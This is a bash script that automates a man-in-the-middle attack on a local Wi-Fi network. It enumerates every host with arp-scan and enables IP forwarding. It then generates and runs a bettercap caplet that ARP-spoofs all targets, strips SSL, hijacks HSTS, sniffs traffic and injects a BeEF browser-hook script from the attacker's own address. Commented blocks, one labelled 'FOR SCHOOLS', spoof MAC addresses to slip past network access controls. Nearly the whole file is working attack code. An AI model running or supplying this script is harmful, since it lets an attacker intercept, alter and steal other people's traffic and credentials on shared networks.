#!/bin/bash

: << 'COMMENT'
This is the first line
This is the second line


		#CHANGING MAC-ADDRESS

#Arraying mac-Addresses
sudo arp-scan -l > mac
awk '{ print $2}' mac > MA_only 
grep ':' MA_only > ups
rm mac MA_only
mapfile -t array <ups
#rm -rf ups

    sudo ifconfig wlan0 down && sudo macchanger -m ${array[$i]} wlan0 && sudo ifconfig wlan0 up
COMMENT




wget -q --spider http://google.com

if [ $? -eq 0 ]; 
then
sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
sudo systemctl stop nginx.service
sudo systemctl start apache2.service
sudo arp-scan -l > 1.txt
sudo arp-scan -l > 2.txt
sudo arp-scan -l > 3.txt
sudo arp-scan -l > 4.txt
tail -n +3 1.txt | head -n -3 > 0.txt && rm 1.txt
tail -n +3 2.txt | head -n -3 > 1.txt && rm 2.txt
tail -n +3 3.txt | head -n -3 > 2.txt && rm 3.txt
tail -n +3 4.txt | head -n -3 > 3.txt && rm 4.txt
awk '{ print $1}' 0.txt 1.txt 2.txt 3.txt > ip.txt
perl -ne 'print unless $dup{$_}++;' ip.txt > ips.txt
rm 0.txt 1.txt 2.txt 3.txt ip.txt
sed -n -e 'H;${x;s/\n/,/g;s/^,//;p;}' ips.txt > finished.txt
rm ips.txt 
b=$(cat finished.txt)
#getting only my ip address
c=$(hostname -I) && d=$(echo -n "${c//[[:space:]]/}")


#make sure to install bettercap and also update the caplets
#scripting bettercap caplet

#make sure also run caplets.update for the first time and get all caplets then replace the hstshijack with the one that comes with this file
#sudo rm -rfv /usr/local/share/bettercap/caplets/hstshijack
#sudo cp -rfv hstshijack /usr/local/share/bettercap/caplets



#starting beef-xss in new terminal
#gnome-terminal -- sudo beef-xss


echo -e $"net.probe on\nset http.proxy.sslstrip true\nset http.proxy.inject.js $d:3000/hook.js\nhttp.proxy on\nset arp.spoof.fullduplex true \nset arp.spoof.targets $b \narp.spoof on\nnet.sniff on\nhstshijack/hstshijack" > spoof.cap
#rm -rf finished.txt
pkill -9 -f bettercap
sudo bettercap -iface wlan0 -caplet spoof.cap




else
#internet not connected
    echo "Check your internet connection!"
fi







: << 'COMMENT'

		#FOR SCHOOLS
		
#Arraying mac-Addresses
sudo arp-scan -l > mac
awk '{ print $2}' mac > MA_only
grep ':' MA_only > ups
rm mac MA_only
mapfile -t array <ups
#rm -rf ups

i=0
len=${#array[@]}
wget -q --spider http://google.com
until [ $? -eq 0 ];
do
    sudo ifconfig wlan0 down && sudo macchanger -m ${array[$i]} wlan0 && sudo ifconfig wlan0 up
    let i++
done

COMMENT
